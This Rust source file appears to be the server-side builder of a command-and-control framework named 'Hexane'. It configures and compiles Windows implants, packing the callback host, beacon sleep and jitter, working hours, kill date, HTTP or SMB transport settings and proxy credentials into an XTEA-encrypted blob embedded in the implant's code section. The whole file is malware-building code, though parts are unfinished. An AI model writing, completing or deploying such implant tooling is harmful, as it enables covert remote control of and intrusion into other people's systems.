use rand::Rng;
use std::{env, fs};
use std::str::FromStr;
use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::sync::mpsc::channel;

use rayon::prelude::*;
use crate::server::rstatic::{DEBUG_FLAGS, HASHES, INSTANCES, RELEASE_FLAGS, SESSION, STRINGS, USERAGENT};
use crate::server::types::{NetworkType, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData};
use crate::server::utils::{create_directory, generate_definitions, generate_hashes, normalize_path, canonical_path_all, run_command, source_to_outpath, wrap_message};
use crate::server::cipher::{crypt_create_key, crypt_xtea};
use crate::server::binary::embed_section_data;
use crate::server::error::{Error, Result};
use crate::server::stream::Stream;
use crate::{log_debug, log_error};

fn map_config(file_path: &String) -> Result<Hexane> {
    let json_file   = env::current_dir()?.join("json").join(file_path);
    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
    let json_data   = serde_json::from_str::<JsonData>(&contents)?;

    let mut instance    = Hexane::default();
    let session         = SESSION.lock()?;

    instance.group_id       = 0;
    instance.main           = json_data.config;
    instance.loader         = json_data.loader;
    instance.builder        = json_data.builder;
    instance.network        = json_data.network;
    instance.user_session   = session.clone();

    Ok(instance)
}

pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
    if args.len() != 3 {
        return Err(Error::Custom("invalid arguments".to_string()))
    }

    let mut instance = map_config(&args[2])?;

    instance.setup_instance()?;
    let session = SESSION.lock()?;

    instance.user_session.username = session.username.clone();
    instance.user_session.is_admin = session.is_admin.clone();

    wrap_message("info", &format!("{} is ready", instance.builder.output_name));
    INSTANCES.lock()?.push(instance);

    // todo: insert db
    Ok(())
}

pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
    // todo: remove from db
    if args.len() < 2 {
        return Err(Error::Custom("invalid arguments".to_string()))
    }

    let mut instances = INSTANCES.lock()?;

    if let Some(pos) = instances.iter().position(|instance| instance.builder.output_name == args[2]) {
        wrap_message("info", &format!("removing {}", instances[pos].builder.output_name));
        instances.remove(pos);

        Ok(())
    } else {
        Err(Error::Custom("Implant not found".to_string()))
    }
}

pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
    // todo: implement
    Ok(())
}

#[derive(Debug, Default)]
pub struct Hexane {
    pub(crate) current_taskid:  u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,
    pub(crate) crypt_key:       Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config_data:     Vec<u8>,
    pub(crate) active:          bool,
    pub(crate) main:            Config,
    pub(crate) builder:         Builder,
    pub(crate) compiler:        Compiler,
    pub(crate) network:         Option<Network>, // says "optional" but is checked for in the config
    pub(crate) loader:          Option<Loader>,
    pub(crate) user_session:    UserSession,
}

impl Hexane {
    fn setup_instance(&mut self) -> Result<()> {
        let mut rng = rand::thread_rng();

        self.compiler.build_directory   = format!("./payload/{}", self.builder.output_name);
        self.peer_id                    = rng.gen::<u32>();
        self.group_id                   = 0;

        self.compiler.compiler_flags = if self.main.debug {
            DEBUG_FLAGS.parse().unwrap()
        } else {
            RELEASE_FLAGS.parse().unwrap()
        };

        match create_directory(&self.compiler.build_directory) {
            Ok(_) => { },
            Err(e) => {
                log_error!(&"setup_instance".to_owned());
                return Err(Error::Custom("could not create build directory".to_owned()))
            }
        }

        match generate_hashes(STRINGS, HASHES) {
            Ok(_)   => { },
            Err(e)  => return Err(Error::Custom(format!("could not generate hashes: {}", e)))
        }

        match self.generate_config_bytes() {
            Ok(_)   => { },
            Err(e)  => return Err(Error::Custom(format!("could not generate config bytes: {}", e)))
        }

        match self.compile_sources() {
            Ok(_)   => { },
            Err(e)  => return Err(Error::Custom(format!("could not compile sources: {}", e)))
        }

        Ok(())
    }

    fn generate_config_bytes(&mut self) -> Result<()> {
        self.crypt_key = crypt_create_key(16);

        let mut patch = match self.create_binary_patch() {
            Ok(patch)   => patch,
            Err(e)      => return Err(Error::Custom(format!("could not create binary patch: {}", e)))
        };

        let encrypt = self.main.encrypt;
        if encrypt {
            let patch_cpy   = patch.clone();
            patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        if let Some(modules) = &self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        } else {
            log_debug!(&"no external module names found. continue.".to_owned());
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            i32::from_str(hours).map_err(|e| Error::Custom(format!("create_binary_patch::{e}")))?
        } else {
            0
        };

        let kill_date = if let Some(ref date) = self.main.killdate {
            i64::from_str(date).map_err(|e| Error::Custom(format!("create_binary_patch::{e}")))?
        } else {
            0
        };

        stream.pack_bytes(&self.crypt_key);
        stream.pack_string(&self.main.hostname);
        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter as u32);
        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        if let Some(network) = self.network.as_mut() {
            match (&network.r#type, &network.options) {

                (NetworkType::Http, NetworkOptions::Http(ref http)) => {
                    let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);

                    stream.pack_wstring(useragent);
                    stream.pack_wstring(&http.address);
                    stream.pack_dword(http.port as u32);
                    stream.pack_dword(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }
                    if let Some(ref domain) = http.domain {
                        stream.pack_string(domain);
                    }
                    if let Some(ref proxy) = http.proxy {
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
                        stream.pack_dword(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap());
                        stream.pack_wstring(proxy.password.as_ref().unwrap());
                    } else {
                        stream.pack_dword(0);
                    }
                }

                (NetworkType::Smb, NetworkOptions::Smb(ref smb)) => {
                    stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
                }

                _ => return Err(Error::Custom("create_binary_patch: unknown network type".to_string())),
            }
        }

        Ok(stream.buffer)
    }

    fn compile_object(&mut self, mut command: String, source: String, mut flags: String) -> Result<()> {
        let build = match source_to_outpath(source, &self.compiler.build_directory) {
            Ok(build)   => build,
            Err(e)      => {
                log_error!(&"could not string build directory".to_string().to_owned());
                return Err(Error::Custom(format!("could not string build directory: {}", e)))
            }
        };

        let mut defs: HashMap<String, Option<u32>> = HashMap::new();

        if command.trim() != "ld" && command.trim() != "nasm" {
            let encrypted   = self.main.encrypt;
            let cfg_size    = self.main.config_size;

            if self.main.debug {
                defs.insert("DEBUG".to_string(), None);
            }

            defs.insert("CONFIG_SIZE".to_string(),  Some(cfg_size));
            defs.insert("ENCRYPTED".to_string(),    Some(if encrypted { 1u32 } else { 0u32 }));
            defs.insert("BSWAP".to_string(),        Some(if &self.main.architecture == "amd64" { 0u32 } else { 1u32 }));

            if let Some(network) = &self.network {
                match network.r#type {
                    NetworkType::Http =>    { defs.insert("TRANSPORT_HTTP".to_string(), None); }
                    NetworkType::Smb =>     { defs.insert("TRANSPORT_PIPE".to_string(), None); }
                }
            }
        }

        let curdir = env::current_dir()?.canonicalize()?;

        command.push_str(&generate_definitions(defs));
        flags.push_str(&format!(" -I{} ", normalize_path(curdir.to_str().unwrap())));
        flags.push_str(&format!(" -o {:?} ", build));

        command.push_str(&flags);
        run_command(&command, &self.peer_id.to_string())
    }

    pub fn compile_sources(&mut self) -> Result<()> {
        let src_path        = Path::new(&self.builder.root_directory).join("src");
        let mut components  = self.compiler.components.clone();

        let entries = match canonical_path_all(src_path) {
            Ok(entries)   => entries,
            Err(e) => {
                log_error!(&"could not get canonical paths in src directory".to_string());
                return Err(Error::Custom(format!("could not get canonical paths in src directory: {}", e)))
            }
        };

        let (err_send, err_recv)    = channel();
        let atoms                   = Arc::new(Mutex::new(()));


        entries.iter().for_each(|absolute_path| {
            if !absolute_path.is_file() {
                return;
            }


            let output  = self.builder.output_name.clone();
            let compile = self.compiler.compiler_flags.clone();

            let mut command = String::new();
            let mut flags   = String::new();

            let atoms_clone = Arc::clone(&atoms);
            let err_handle  = err_send.clone();
            let _guard      = atoms_clone.lock().unwrap();

            let absolute_str = absolute_path.to_str().unwrap();

            if !Path::new(absolute_str).exists() {
                println!("file does not exist: {}", absolute_str.to_string());
                return;
            }

            match absolute_path.extension().and_then(|ext| ext.to_str()) {

                Some("asm") => {
                    command.push_str("nasm");
                    flags = " -f win64 ".to_string();
                    flags.push_str(&absolute_str);
                }

                Some("cpp") => {
                    command.push_str("x86_64-w64-mingw32-g++");
                    flags.push_str(" -c ");
                    flags.push_str(&absolute_str);
                    flags.push_str(" ");
                    flags.push_str(compile.as_str());
                }

                _ => {
                    return;
                }
            }

            if let Err(e) = self.compile_object(command, absolute_str.to_string(), flags) {
                err_handle.send(e).unwrap();
            } else {
                components.push(output);
            }
        });

        if let Ok(e) = err_recv.try_recv() {
            return Err(Error::Custom(format!("compile_sources::{e}")));
        }

        wrap_message("debug", &"Linking final objects".to_owned());
        match embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice()) {
            Ok(_)   => { },
            Err(e)  => return Err(Error::Custom(format!("embed_section_data: {}", e))),
        }

        // TODO: link all objects

        Ok(())
    }
}
